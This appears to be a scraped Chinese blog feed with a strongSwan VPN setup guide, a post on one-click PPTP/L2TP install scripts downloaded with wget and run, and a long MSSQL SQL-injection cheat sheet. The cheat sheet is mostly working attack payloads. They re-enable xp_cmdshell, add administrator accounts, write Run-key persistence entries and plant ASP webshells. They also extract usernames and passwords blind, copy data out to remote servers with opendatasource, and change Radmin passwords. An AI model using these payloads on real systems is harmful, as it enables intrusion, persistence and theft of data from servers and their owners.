&lt;pre class=&quot;  language-markup&quot;&gt;` &lt;span class=&quot;hljs-title&quot;&gt;charon&lt;/span&gt; {
         &lt;span class=&quot;hljs-title&quot;&gt;load_modular&lt;/span&gt; = &lt;span class=&quot;hljs-built_in&quot;&gt;yes&lt;/span&gt;
         duplicheck.enable = &lt;span class=&quot;hljs-built_in&quot;&gt;no&lt;/span&gt;
         compress = &lt;span class=&quot;hljs-built_in&quot;&gt;yes&lt;/span&gt;
         plugins {
                 &lt;span class=&quot;hljs-title&quot;&gt;include&lt;/span&gt; strongswan.d/charon/&lt;span class=&quot;hljs-regexp&quot;&gt;*.conf&lt;/span&gt;
         }
         dns1 = &lt;span class=&quot;hljs-number&quot;&gt;8.8.8.8&lt;/span&gt;
         dns2 = &lt;span class=&quot;hljs-number&quot;&gt;8.8.4.4&lt;/span&gt;
         nbns1 = &lt;span class=&quot;hljs-number&quot;&gt;8.8.8.8&lt;/span&gt;
         nbns2 = &lt;span class=&quot;hljs-number&quot;&gt;8.8.4.4&lt;/span&gt;
 }
 include strongswan.d/&lt;span class=&quot;hljs-regexp&quot;&gt;*.conf&lt;/span&gt;
`&lt;/pre&gt;
编辑`/usr/local/etc/ipsec.secrets`中的用户名、密码
&lt;pre class=&quot;  language-markup&quot;&gt;`: RSA server.pem
: PSK &lt;span class=&quot;hljs-string&quot;&gt;&quot;mykey&quot;&lt;/span&gt;
: XAUTH &lt;span class=&quot;hljs-string&quot;&gt;&quot;mykey&quot;&lt;/span&gt;
[用户名] %any : EAP &lt;span class=&quot;hljs-string&quot;&gt;&quot;[密码]&quot;&lt;/span&gt;
`&lt;/pre&gt;
注意将PSK、XAUTH处的&quot;mykey&quot;编辑为**唯一且私密的字符串**，并且将[用户名]改为自己想要的登录名，[密码]改为自己想要的密码（[]符号去掉），可以添加多行，得到多个用户。

4.修改系统转发以及防火墙配置
首先编辑`/etc/sysctl.conf`，将`net.ipv4.ip_forward=1`一行前面的`#`号去掉，保存后执行`sysctl -p`。
接下来修改iptables。
OpenVZ执行：
&lt;pre class=&quot;  language-markup&quot;&gt;`&lt;span class=&quot;hljs-title&quot;&gt;iptables&lt;/span&gt; -A FORWARD -m state --state RELATED,ESTABLISHED -j ACCEPT
iptables -A FORWARD -s &lt;span class=&quot;hljs-number&quot;&gt;10.31.0.0&lt;/span&gt;/&lt;span class=&quot;hljs-number&quot;&gt;24&lt;/span&gt;  -j ACCEPT
iptables -A FORWARD -s &lt;span class=&quot;hljs-number&quot;&gt;10.31.1.0&lt;/span&gt;/&lt;span class=&quot;hljs-number&quot;&gt;24&lt;/span&gt;  -j ACCEPT
iptables -A FORWARD -s &lt;span class=&quot;hljs-number&quot;&gt;10.31.2.0&lt;/span&gt;/&lt;span class=&quot;hljs-number&quot;&gt;24&lt;/span&gt;  -j ACCEPT
iptables -A INPUT -i venet0 -p esp -j ACCEPT
iptables -A INPUT -i venet0 -p udp --dport &lt;span class=&quot;hljs-number&quot;&gt;500&lt;/span&gt; -j ACCEPT
iptables -A INPUT -i venet0 -p tcp --dport &lt;span class=&quot;hljs-number&quot;&gt;500&lt;/span&gt; -j ACCEPT
iptables -A INPUT -i venet0 -p udp --dport &lt;span class=&quot;hljs-number&quot;&gt;4500&lt;/span&gt; -j ACCEPT
iptables -A INPUT -i venet0 -p udp --dport &lt;span class=&quot;hljs-number&quot;&gt;1701&lt;/span&gt; -j ACCEPT
iptables -A INPUT -i venet0 -p tcp --dport &lt;span class=&quot;hljs-number&quot;&gt;1723&lt;/span&gt; -j ACCEPT
iptables -A FORWARD -j REJECT
iptables -t nat -A POSTROUTING -s &lt;span class=&quot;hljs-number&quot;&gt;10.31.0.0&lt;/span&gt;/&lt;span class=&quot;hljs-number&quot;&gt;24&lt;/span&gt; -o venet0 -j MASQUERADE
iptables -t nat -A POSTROUTING -s &lt;span class=&quot;hljs-number&quot;&gt;10.31.1.0&lt;/span&gt;/&lt;span class=&quot;hljs-number&quot;&gt;24&lt;/span&gt; -o venet0 -j MASQUERADE
iptables -t nat -A POSTROUTING -s &lt;span class=&quot;hljs-number&quot;&gt;10.31.2.0&lt;/span&gt;/&lt;span class=&quot;hljs-number&quot;&gt;24&lt;/span&gt; -o venet0 -j MASQUERADE
`&lt;/pre&gt;
其它服务器执行
&lt;pre class=&quot;  language-markup&quot;&gt;`&lt;span class=&quot;hljs-title&quot;&gt;iptables&lt;/span&gt; -A FORWARD -m state --state RELATED,ESTABLISHED -j ACCEPT
iptables -A FORWARD -s &lt;span class=&quot;hljs-number&quot;&gt;10.31.0.0&lt;/span&gt;/&lt;span class=&quot;hljs-number&quot;&gt;24&lt;/span&gt;  -j ACCEPT
iptables -A FORWARD -s &lt;span class=&quot;hljs-number&quot;&gt;10.31.1.0&lt;/span&gt;/&lt;span class=&quot;hljs-number&quot;&gt;24&lt;/span&gt;  -j ACCEPT
iptables -A FORWARD -s &lt;span class=&quot;hljs-number&quot;&gt;10.31.2.0&lt;/span&gt;/&lt;span class=&quot;hljs-number&quot;&gt;24&lt;/span&gt;  -j ACCEPT
iptables -A INPUT -i eth0 -p esp -j ACCEPT
iptables -A INPUT -i eth0 -p udp --dport &lt;span class=&quot;hljs-number&quot;&gt;500&lt;/span&gt; -j ACCEPT
iptables -A INPUT -i eth0 -p tcp --dport &lt;span class=&quot;hljs-number&quot;&gt;500&lt;/span&gt; -j ACCEPT
iptables -A INPUT -i eth0 -p udp --dport &lt;span class=&quot;hljs-number&quot;&gt;4500&lt;/span&gt; -j ACCEPT
iptables -A INPUT -i eth0 -p udp --dport &lt;span class=&quot;hljs-number&quot;&gt;1701&lt;/span&gt; -j ACCEPT
iptables -A INPUT -i eth0 -p tcp --dport &lt;span class=&quot;hljs-number&quot;&gt;1723&lt;/span&gt; -j ACCEPT
iptables -A FORWARD -j REJECT
iptables -t nat -A POSTROUTING -s &lt;span class=&quot;hljs-number&quot;&gt;10.31.0.0&lt;/span&gt;/&lt;span class=&quot;hljs-number&quot;&gt;24&lt;/span&gt; -o eth0 -j MASQUERADE
iptables -t nat -A POSTROUTING -s &lt;span class=&quot;hljs-number&quot;&gt;10.31.1.0&lt;/span&gt;/&lt;span class=&quot;hljs-number&quot;&gt;24&lt;/span&gt; -o eth0 -j MASQUERADE
iptables -t nat -A POSTROUTING -s &lt;span class=&quot;hljs-number&quot;&gt;10.31.2.0&lt;/span&gt;/&lt;span class=&quot;hljs-number&quot;&gt;24&lt;/span&gt; -o eth0 -j MASQUERADE
`&lt;/pre&gt;
接下来（公共部分）保存iptables配置并配置开机自动载入
&lt;pre class=&quot;  language-markup&quot;&gt;`iptables-save &amp;gt; /etc/iptables.rules
cat &amp;gt; /etc/network/&lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt;-up.d/iptables&amp;lt;&amp;lt;EOF
&lt;span class=&quot;hljs-shebang&quot;&gt;#!/bin/sh&lt;/span&gt;
iptables-restore &amp;lt; /etc/iptables.rules
EOF
chmod +x /etc/network/&lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt;-up.d/iptables
</code></pre><p>5.尝试连接<br>WP8.1手机安装ca.cert.pem，进入设置-VPN添加IKEv2连接，地址为<strong>证书中的地址或IP</strong>，通过用户名-密码连接。<br>Windows连接也是一样，但注意<strong>将证书导入本地计算机而不是当前用户的“受信任的证书颁发机构”</strong>。<br>iOS/Android/Mac OS X设备添加Cisco IPSec PSK验证方式，预共享密钥是<code>/usr/local/etc/ipsec.secrets</code>中PSK后的字符串（不含引号），用户名密码同上，<strong>可以通过任意域名或IP连接，不需要证书</strong></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[搬瓦工 科学上网 vpn一键安装包(以测能安装成功)]]></title>
      <url>http://www.linux52.com/2015-04-26-e6-90-ac-e7-93-a6-e5-b7-a5-e7-a7-91-e5-ad-a6-e4-b8-8a-e7-bd-91-vpn-e4-b8-80-e9-94-ae-e5-ae-89-e8-a3-85-e5-8c-85-e4-bb-a5-e6-b5-8b-e8-83-bd-e5-ae-89-e8-a3-85-e6-88-90-e5-8a-9f.html</url>
      <content type="html"><![CDATA[<p>pptp 一键安装脚本<br><a href="http://www.danbaise.com/app/pptpd_vpn_centos-5-6.sh" target="_blank" rel="external">http://www.danbaise.com/app/pptpd_vpn_centos-5-6.sh</a><br>wget <a href="http://www.danbaise.com/app/pptpd_vpn_centos-5-6.sh" target="_blank" rel="external">http://www.danbaise.com/app/pptpd_vpn_centos-5-6.sh</a><br>chmod 777 pptpd_vpn_centos-5-6.sh<br>./pptpd_vpn_centos-5-6.sh<br>1. my system is centos5 32bit(only support 32bit)<br>适合32位系统<br>2. my system is centos6 32bit or 64bit(they are support)<br>适合64位系统<br>3. repaire VPN service<br>修复VPN 服务。<br>4. add VPN user<br>新建VPN帐号。</p>
<p><a href="http://dg2016.duapp.com/wp-content/uploads/2015/04/pptpd_vpn_centos-5-6.zip" target="_blank" rel="external">pptpd_vpn_centos-5-6</a></p>
<p>l2tp 一键安装脚本<br><a href="http://www.danbaise.com/app/l2tp_centos.sh" target="_blank" rel="external">http://www.danbaise.com/app/l2tp_centos.sh</a><br>wget <a href="http://www.danbaise.com/app/l2tp_centos.sh" target="_blank" rel="external">http://www.danbaise.com/app/l2tp_centos.sh</a><br>chmod 777 l2tp_centos.sh<br>./l2tp_centos.sh<br>1、intall VPN service<br>全新安装L2TP VPN<br>2、repaire VPN service<br>修复L2TP VPN 服务<br>3、add VPN user<br>新建VPN帐号</p>
<p><a href="http://dg2016.duapp.com/wp-content/uploads/2015/04/l2tp_centos.zip" target="_blank" rel="external">l2tp_centos</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[mssql 注入]]></title>
      <url>http://www.linux52.com/2015-04-25-mssql-e6-b3-a8-e5-85-a5.html</url>
      <content type="html"><![CDATA[<p><strong>注入查阅</strong></p>
<p>源文：<a href="http://www.csdn123.com/html/itweb/20130818/66552_66558_66559.htm" target="_blank" rel="external">http://www.csdn123.com/html/itweb/20130818/66552_66558_66559.htm</a></p>
<div class="cnblogs_code"><img src="http://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif" alt=""><br><div id="cnblogs_code_open_c36fda50-cd5d-4535-bf72-438ce7d55e05" class="cnblogs_code_hide"><br><pre>1、返回的是连接的数据库名<br>and db_name()&gt;0<br>2、作用是获取连接用户名<br>and user&gt;0<br>3、将数据库备份到Web目录下面<br>;backup database 数据库名 to disk=’c:\inetpub\wwwroot\1.db’;–<br>4、显示SQL系统版本<br>and 1=(select @@VERSION) 或and 1=convert(int,@@version)–<br>5、判断xp_cmdshell扩展存储过程是否存在<br>and 1=(SELECT count(<em>) FROM master.dbo.sysobjects WHERE xtype = ‘X’ AND name =’xp_cmdshell’)<br>6、恢复xp_cmdshell扩展存储的命令<br>;exec master.dbo.sp_addextendedproc ‘xp_cmdshell’,’e:\inetput\web\xplog70.dll’;–<br>7、向启动组中写入命令行和执行程序<br>;EXEC master.dbo.xp_regwrite ‘HKEY_LOCAL_MACHINE’,’SOFTWARE\Microsoft\Windows\CurrentVersion\<br>Run’,’help1’,’REG_SZ’,’cmd.exe /c net user test ptlove /add’<br>8、查看当前的数据库名称<br>and 0 &lt;&gt; db_name(n) n改成0,1,2,3……就可以跨库了 或and 1=convert(int,db_name())–<br>9、不需xp_cmdshell支持在有注入漏洞的SQL服务器上运行CMD命令（同第76）<br>10、则把得到的数据内容全部备份到WEB目录下<br>;backup database 数据库名 to disk=’c:\inetpub\wwwroot\save.db’<br>11、通过复制CMD创建UNICODE漏洞<br>;exec master.dbo.xp_cmdshell “copy c:\winnt\system32\cmd.exe   c:\inetpub\scripts\cmd.exe”<br>12、遍历系统的目录结构，分析结果并发现WEB虚拟目录<br>先创建一个临时表：temp ;create table temp(id nvarchar(255),num1 nvarchar(255),num2 nvarchar(255),num3 nvarchar(255));–<br>(1)利用xp_availablemedia来获得当前所有驱动器,并存入temp表中    ;insert temp exec master.dbo.xp_availablemedia;–<br>通过查询temp的内容来获得驱动器列表及相关信息<br>(2)利用xp_subdirs获得子目录列表,并存入temp表中                    ;insert into temp(id) exec master.dbo.xp_subdirs ‘c:\’;–<br>(3)还可以利用xp_dirtree获得所有子目录的目录树结构,并寸入temp表中   ;insert into temp(id,num1) exec master.dbo.xp_dirtree ‘c:\’;– （实验成功）<br>13、查看某个文件的内容，可以通过执行xp_cmdsell<br>;insert into temp(id) exec master.dbo.xp_cmdshell ‘type c:\web\index.asp’;–<br>14、将一个文本文件插入到一个临时表中<br>;bulk insert temp(id) from ‘c:\inetpub\wwwroot\index.asp’<br>15、每完成一项浏览后，应删除TEMP中的所有内容，删除方法是：<br>;delete from temp;–<br>16、浏览TEMP表的方法是：<br>and (select top 1 id from TestDB.dbo.temp)&gt;0 假设TestDB是当前连接的数据库名<br>17、猜解所有数据库名称<br>and (select count(</em>) from master.dbo.sysdatabases where name&gt;1 and dbid=6) &lt;&gt;0   dbid=6,7,8分别得到其它库名<br>18、猜解数据库中用户名表的名称<br>and (select count(<em>) from TestDB.dbo.表名)&gt;0 若表名存在，则abc.asp工作正常，否则异常。如此循环，直到猜到系统帐号表的名称。<br>19、判断是否是sysadmin权限<br>and 1=(SELECT IS_SRVROLEMEMBER(‘sysadmin’))<br>20、判断是否是SA用户<br>‘sa’=(SELECT System_user)<br>21、查看数据库角色<br>;use model–<br>22、查看库名<br>and 0&lt;&gt;(select count(</em>) from master.dbo.sysdatabases where name&gt;1 and dbid=6)–<br>23、获得第一个用户建立表的名称<br>and (select top 1 name from TestDB.dbo.sysobjects where xtype=’U’ and status&gt;0 )&gt;0   假设要获得数据库是TestDB.dbo<br>24、获得第二个用户建立的表的名称<br>and (select top 1 name from TestDB.dbo.sysobjects where xtype=’U’ and status&gt;0 and name not in(‘xyz’))&gt;0<br>25、获得第三个用户建立的表的名称<br>and (select top 1 name from TestDB.dbo.sysobjects where xtype=’U’ and status&gt;0 and name not in(‘xyz’,’’))&gt;0   ‘’中为第二个用户名<br>26、获得第四个用户建立的表的名称<br>and (select top 1 name from TestDB.dbo.sysobjects where xtype=’U’ and status&gt;0 and name not in(‘xyz’,’’,’’))&gt;0   ‘’,’’中为第二,三个用户名<br>27、获得表中记录的条数<br>and (select count(<em>) from 表名）&lt;5 记录条数小于5   或   &lt;10 记录条数小于10   ……等等<br>28、测试权限结构（mssql）<br>and 1=(SELECT IS_SRVROLEMEMBER(‘sysadmin’));–<br>and 1=(SELECT IS_SRVROLEMEMBER(‘serveradmin’));–<br>and 1=(SELECT IS_SRVROLEMEMBER(‘setupadmin’));–<br>and 1=(SELECT IS_SRVROLEMEMBER(‘securityadmin’));–<br>and 1=(SELECT IS_SRVROLEMEMBER(‘diskadmin’));–<br>and 1=(SELECT IS_SRVROLEMEMBER(‘bulkadmin’));–<br>and 1=(SELECT IS_MEMBER(‘db_owner’));–<br>29、 添加mssql和系统的帐户<br>;exec master.dbo.sp_addlogin username;–<br>;exec master.dbo.sp_password null,username,password;–<br>;exec master.dbo.sp_addsrvrolemember sysadmin username;–<br>;exec master.dbo.xp_cmdshell ‘net user username password /workstations:</em> /times:all /passwordchg:yes /passwordreq:yes /active:yes /add’;–<br>;exec master.dbo.xp_cmdshell ‘net user username password /add’;–<br>;exec master.dbo.xp_cmdshell ‘net localgroup administrators username /add’;–<br>30、 简洁的webshell<br>use model<br>create table cmd(str image);<br>insert into cmd(str) values (‘&lt;%=server.createobject(“wscript.shell”).exec(“cmd.exe /c “&amp;request(“c”)).stdout.readall%&gt;’);<br>backup database model to disk=’g:\wwwtest\l.asp’;<br><br>请求的时候，像这样子用：<br><a href="http://ip/l.asp?c=dir" target="_blank" rel="external">http://ip/l.asp?c=dir</a><br>31、猜解字段名称<br>猜解法：and (select count(字段名) from 表名)&gt;0   若“字段名”存在，则返回正常<br>读取法：and (select top 1 col_name(object_id(‘表名’),1) from sysobjects)&gt;0   把col_name(object_id(‘表名’),1)中的1依次换成2,3,4,5，6…就可得到所有的字段名称。<br>32、 猜解用户名与密码<br>ASCII码逐字解码法:基本的思路是先猜出字段的长度，然后依次猜出每一位的值<br>and (select top 1 len(username) from admin)=X(X=1,2，3,4，5，… n，假设：username为用户名字段的名称，admin为表的名称   若x为某一值i且abc.asp运行正常时，则i就是第一个用户名的长度。<br>and (select top 1 ascii(substring(username,m,1)) from admin)=n   (m的值在上一步得到的用户名长度之间，当m=1，2,3，…时猜测分别猜测第1,2,3,…位的值；n的值是1~9、a~z、A~Z的ASCII值，也就是1~128之间的任意值；admin为系统用户帐号表的名称)，<br>33、建立数据表<br>;create table 表名 (列名1 数据类型,列名2 数据类型);–<br>34、向表格中插入数据<br>;insert into 表名 (列名1,列名2，……） values (‘值1’,’值2’……);–<br>35、更新记录<br>update 表名 set 列名1=’值’…… where ……<br>36、删除记录<br>delete from 表名 where ……<br>37、删除数据库表格<br>drop table 表名<br>38、将文本文件导入表<br>使用’bulk insert’语法可以将一个文本文件插入到一个临时表中。简单地创建这个表：<br>create table foo( line varchar(8000))<br>然后执行bulk insert操作把文件中的数据插入到表中，如：<br>bulk insert foo from ‘c:\inetpub\wwwroot\process_login.asp’<br>39、备份当前数据库的命令：<br>declare @a sysname;set @a=db_name();backup database @a to disk=’你的IP你的共享目录bak.dat’ ,name=’test’;–<br>40、使用sp_makewebtask处理过程的相关请求写入URL<br>; EXEC master..sp_makewebtask “\10.10.1.3\share\output.html”, “SELECT <em> FROM INFORMATION_SCHEMA.TABLES”<br>41、将获得SQLSERVER进程的当前工作目录中的目录列表<br>Exec master..xp_cmdshell ‘dir’<br>42、将提供服务器上所有用户的列表<br>Exec master..xp_cmdshell ‘net user’<br>43、读注册表存储过程<br>exec xp_regread HKEY_LOCAL_MACHINE,’SYSTEM\CurrentControlSet\Services\lanmanserver\parameters’, ‘nullsessionshares’<br>44、xp_servicecontrol过程允许用户启动，停止，暂停和继续服务<br>exec master..xp_servicecontrol ‘start’,’schedule’<br>exec master..xp_servicecontrol ‘start’,’server’<br>45、显示机器上有用的驱动器<br>Xp_availablemedia<br>46、允许获得一个目录树<br>Xp_dirtree<br>47、提供进程的进程ID，终止此进程<br>Xp_terminate_process<br>48、恢复xp_cmdshell<br>Exec master.dbo.addextendedproc ‘xp_cmdshell’,’xplog70.dll’<br>49、堵上cmdshell的SQL语句<br>sp_dropextendedproc “xp_cmdshell”<br>50、不需要XP_CMDSHLL直接添加系统帐号,对XPLOG70.DLL被删很有效<br>declare @shell int exec sp_oacreate ‘wscript.shell’,@shell output exec sp_oamethod @shell,’run’,null,’c:\winnt\system32\cmd.exe /c net user gchn aaa /add’–<br>51、在数据库内添加一个hax用户<br>;exec sp_addlogin hax;–<br>52、给hax设置密码<br>;exec master.dbo.sp_password null,username,password;–<br>53、将hax添加到sysadmin组<br>;exec master.dbo.sp_addsrvrolemember sysadmin hax;–<br>54、(1)遍历目录<br>;create table dirs(paths varchar(100), id int)<br>;insert dirs exec master.dbo.xp_dirtree ‘c:\’<br>;and (select top 1 paths from dirs)&gt;0<br>;and (select top 1 paths from dirs where paths not in(‘上步得到的paths’))&gt;)<br>55、(2)遍历目录<br>;create table temp(id nvarchar(255),num1 nvarchar(255),num2 nvarchar(255),num3 nvarchar(255));–<br>;insert temp exec master.dbo.xp_availablemedia;– 获得当前所有驱动器<br>;insert into temp(id) exec master.dbo.xp_subdirs ‘c:\’;– 获得子目录列表<br>;insert into temp(id,num1) exec master.dbo.xp_dirtree ‘c:\’;– 获得所有子目录的目录树结构<br>;insert into temp(id) exec master.dbo.xp_cmdshell ‘type c:\web\index.asp’;– 查看文件的内容<br>56、mssql中的存储过程<br>xp_regenumvalues 注册表根键, 子键<br>;exec xp_regenumvalues ‘HKEY_LOCAL_MACHINE’,’SOFTWARE\Microsoft\Windows\CurrentVersion\Run’ 以多个记录集方式返回所有键值<br>xp_regread 根键,子键,键值名<br>;exec xp_regread ‘HKEY_LOCAL_MACHINE’,’SOFTWARE\Microsoft\Windows\CurrentVersion’,’CommonFilesDir’ 返回制定键的值<br>xp_regwrite 根键,子键, 值名, 值类型, 值<br>值类型有2种REG_SZ 表示字符型,REG_DWORD 表示整型<br>;exec xp_regwrite ‘HKEY_LOCAL_MACHINE’,’SOFTWARE\Microsoft\Windows\CurrentVersion’,’TestValueName’,’reg_sz’,’hello’ 写入注册表<br>xp_regdeletevalue 根键,子键,值名<br>exec xp_regdeletevalue ‘HKEY_LOCAL_MACHINE’,’SOFTWARE\Microsoft\Windows\CurrentVersion’,’TestValueName’ 删除某个值<br>xp_regdeletekey ‘HKEY_LOCAL_MACHINE’,’SOFTWARE\Microsoft\Windows\CurrentVersion\Tes</em></pre><br></div><br><span class="cnblogs_code_collapse">View Code</span></div><br><div class="cnblogs_code"><img src="http://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif" alt=""><br><div id="cnblogs_code_open_e27c848f-25c3-4002-a5df-087ca726e167" class="cnblogs_code_hide"><br><pre>啊D注入的命令：<br><br>//看看是什么权限的<br>and 1=(Select IS_MEMBER(‘db_owner’))<br>And char(124)%2BCast(IS_MEMBER(‘db_owner’) as varchar(1))%2Bchar(124)=1 ;–<br><br>//检测是否有读取某数据库的权限<br>and 1= (Select HAS_DBACCESS(‘master’))<br>And char(124)%2BCast(HAS_DBACCESS(‘master’) as varchar(1))%2Bchar(124)=1 –<br><br>数字类型<br>and char(124)%2Buser%2Bchar(124)=0<br><br>字符类型<br>‘ and char(124)%2Buser%2Bchar(124)=0 and ‘’=’<br><br>搜索类型<br>‘ and char(124)%2Buser%2Bchar(124)=0 and ‘%’=’<br><br>爆用户名<br>and user&gt;0<br>‘ and user&gt;0 and ‘’=’<br><br>检测是否为SA权限<br>and 1=(select IS_SRVROLEMEMBER(‘sysadmin’));–<br>And char(124)%2BCast(IS_SRVROLEMEMBER(0x730079007300610064006D0069006E00) as varchar(1))%2Bchar(124)=1 –<br><br>检测是不是MSSQL数据库<br>and exists (select  from sysobjects);–<br><br>检测是否支持多行<br>;declare @d int;–<br><br>恢复 xp_cmdshell<br>;exec master..dbo.sp_addextendedproc ‘xp_cmdshell’,’xplog70.dll’;–<br><br>select <em> from openrowset(‘sqloledb’,’server=192.168.1.200,1433;uid=test;pwd=pafpaf’,’select @@version’)<br><br>//———————–<br>//      执行命令<br>//———————–<br>首先开启沙盘模式：<br>exec master..xp_regwrite ‘HKEY_LOCAL_MACHINE’,’SOFTWARE\Microsoft\Jet\4.0\Engines’,’SandBoxMode’,’REG_DWORD’,1<br><br>然后利用jet.oledb执行系统命令<br>select </em> from openrowset(‘microsoft.jet.oledb.4.0’,’;database=c:\winnt\system32\ias\ias.mdb’,’select shell(“cmd.exe /c net user admin admin1234 /add”)’)<br><br>执行命令<br>;DECLARE @shell INT EXEC SP_OAcreate ‘wscript.shell’,@shell OUTPUT EXEC SP_OAMETHOD @shell,’run’,null, ‘C:\WINNT\system32\cmd.exe /c net user paf pafpaf /add’;–<br><br>EXEC [master].[dbo].[xp_cmdshell] ‘cmd /c md c:\1111’<br><br>判断xp_cmdshell扩展存储过程是否存在：<br>[url=<a href="http://192.168.1.5/display.asp?keyno=188]链接标记http://192.168.1.5/display.asp?keyno=188[/url" target="_blank" rel="external">http://192.168.1.5/display.asp?keyno=188]链接标记http://192.168.1.5/display.asp?keyno=188[/url</a>] and 1=(Select count(<em>) FROM master.dbo.sysobjects Where xtype = ‘X’ AND name = ‘xp_cmdshell’)<br><br>写注册表<br>exec master..xp_regwrite ‘HKEY_LOCAL_MACHINE’,’SOFTWARE\Microsoft\Jet\4.0\Engines’,’SandBoxMode’,’REG_DWORD’,1<br><br>REG_SZ<br><br>读注册表<br>exec master..xp_regread ‘HKEY_LOCAL_MACHINE’,’SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon’,’Userinit’<br><br>读取目录内容<br>exec master..xp_dirtree ‘c:\winnt\system32\’,1,1<br><br>数据库备份<br>backup database pubs to disk = ‘c:\123.bak’<br><br>//爆出长度<br>And (Select char(124)%2BCast(Count(1) as varchar(8000))%2Bchar(124) From D99_Tmp)=0 ;–<br><br>更改sa口令方法：用sql综合利用工具连接后，执行命令：<br>exec sp_password NULL,’新密码’,’sa’<br><br>添加和删除一个SA权限的用户test：<br>exec master.dbo.sp_addlogin test,ptlove<br>exec master.dbo.sp_addsrvrolemember test,sysadmin<br><br>删除扩展存储过过程xp_cmdshell的语句:<br>exec sp_dropextendedproc ‘xp_cmdshell’<br><br>添加扩展存储过过程<br>EXEC [master]..sp_addextendedproc ‘xp_proxiedadata’, ‘c:\winnt\system32\sqllog.dll’<br>GRANT exec On xp_proxiedadata TO public<br><br>停掉或激活某个服务。<br><br>exec master..xp_servicecontrol ‘stop’,’schedule’<br>exec master..xp_servicecontrol ‘start’,’schedule’<br><br>dbo.xp_subdirs<br><br>只列某个目录下的子目录。<br>xp_getfiledetails ‘C:\Inetpub\wwwroot\SQLInject\login.asp’<br><br>dbo.xp_makecab<br><br>将目标多个档案压缩到某个目标档案之内。<br>所有要压缩的档案都可以接在参数列的最后方，以逗号隔开。<br><br>dbo.xp_makecab<br>‘c:\test.cab’,’mszip’,1,<br>‘C:\Inetpub\wwwroot\SQLInject\login.asp’,<br>‘C:\Inetpub\wwwroot\SQLInject\securelogin.asp’<br><br>xp_terminate_process<br><br>停掉某个执行中的程序，但赋予的参数是 Process ID。<br>利用”工作管理员”，透过选单「检视」-「选择字段」勾选 pid，就可以看到每个执行程序的 Process ID<br><br>xp_terminate_process 2484<br><br>xp_unpackcab<br><br>解开压缩档。<br><br>xp_unpackcab ‘c:\test.cab’,’c:\temp’,1<br><br>某机，安装了radmin，密码被修改了，regedit.exe不知道被删除了还是被改名了，net.exe不存在，没有办法使用regedit /e 导入注册文件，但是mssql是sa权限，使用如下命令 EXEC master.dbo.xp_regwrite ‘HKEY_LOCAL_MACHINE’,’SYSTEM\RAdmin\v2.0\Server\Parameters’,’Parameter’,’REG_BINARY’,0x02ba5e187e2589be6f80da0046aa7e3c 即可修改密码为12345678。如果要修改端口值 EXEC master.dbo.xp_regwrite ‘HKEY_LOCAL_MACHINE’,’SYSTEM\RAdmin\v2.0\Server\Parameters’,’port’,’REG_BINARY’,0xd20400 则端口值改为1234<br><br>create database lcx;<br>Create TABLE ku(name nvarchar(256) null);<br>Create TABLE biao(id int NULL,name nvarchar(256) null);<br><br>//得到数据库名<br>insert into opendatasource(‘sqloledb’,’server=211.39.145.163,1443;uid=test;pwd=pafpaf;database=lcx’).lcx.dbo.ku select name from master.dbo.sysdatabases<br><br>//在Master中创建表，看看权限怎样<br>Create TABLE master..D_TEST(id nvarchar(4000) NULL,Data nvarchar(4000) NULL);–<br><br>用 sp_makewebtask直接在web目录里写入一句话马：<br>[url=<a href="http://127.0.0.1/dblogin123.asp?username=123]链接标记http://127.0.0.1/dblogin123.asp?username=123&#39;[/url];exec%20sp_makewebtask%20&#39;d:\www\tt\88.asp&#39;,&#39;%20select%20&#39;&#39;&lt;%25execute(request(&quot;a&quot;))%25&gt;&#39;&#39;%20&#39;;--" target="_blank" rel="external">http://127.0.0.1/dblogin123.asp?username=123]链接标记http://127.0.0.1/dblogin123.asp?username=123&#39;[/url];exec%20sp_makewebtask%20&#39;d:\www\tt\88.asp&#39;,&#39;%20select%20&#39;&#39;&lt;%25execute(request(&quot;a&quot;))%25&gt;&#39;&#39;%20&#39;;--</a><br><br>//更新表内容<br>Update films SET kind = ‘Dramatic’ Where id = 123<br><br>//删除内容<br>delete from table_name where Stockid = 3</em></pre><br></div><br><span class="cnblogs_code_collapse">View Code</span></div><br>&nbsp;<br><br>&nbsp;<br><br><strong>MSSQL下执行系统命令</strong><br><div class="cnblogs_code"><img src="http://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif" alt=""><br><div id="cnblogs_code_open_8e0abe95-1edf-4fd8-9f8a-c2f3f7e3ede7" class="cnblogs_code_hide"><br><pre>假设我们已经连接一台1433的服务器,<br><br>那我们要如何来执行系统命令呢，这里我就给大家讲解下啦.<br><br>1).XP_CMDSHELL ‘cmd.exe /c net user aaa bbb /add’<br>人人都知道的办法,最大的好处是有回显,但是最怕<br><br>if exists (select  from dbo.sysobjects where id = object_id(N’[dbo].[xp_cmdshell]’) and OBJECTPROPERTY(id, N’IsExtendedProc’) = 1)<br>exec sp_dropextendedproc N’[dbo].[xp_cmdshell]’<br>GO<br><br>通过上面的T-SQL语句就可以把这个扩展储存删了<br><br>我们一般可以用<br>2k:<br>EXEC sp_addextendedproc xp_cmdshell ,@dllname =’xplog70.dll’<br>SQL97:<br>EXEC sp_addextendedproc xp_cmdshell ,@dllname =’xpsql70.dll’<br><br>就还原了.<br><br>但是有的人知道sp_addextendedproc也只不过是一个储存过程一样可以删除的<br><br>Drop PROCEDURE sp_addextendedproc<br>if exists (select <em> from<br>dbo.sysobjects where id = object_id(N’[dbo].[xp_cmdshell]’) and<br>OBJECTPROPERTY(id, N’IsExtendedProc’) = 1)<br>exec sp_dropextendedproc N’[dbo].[xp_cmdshell]’<br>GO<br><br>还原:<br>create procedure sp_addextendedproc — 1996/08/30 20:13<br>@functname nvarchar(517),/</em> (owner.)name of function to call <em>/<br>@dllname varchar(255)/</em> name of DLL containing function <em>/<br>as<br>set implicit_transactions off<br>if @@trancount &gt; 0<br>begin<br>raiserror(15002,-1,-1,’sp_addextendedproc’)<br>return (1)<br>end<br>/</em><br><strong> Create the extended procedure mapping.<br><em>/<br>dbcc addextendedproc( @functname, @dllname)<br>return (0) – sp_addextendedproc<br>GO<br><br>唉呀呀写了这么多其实有个最简单的保护办法:<br>先NET stop 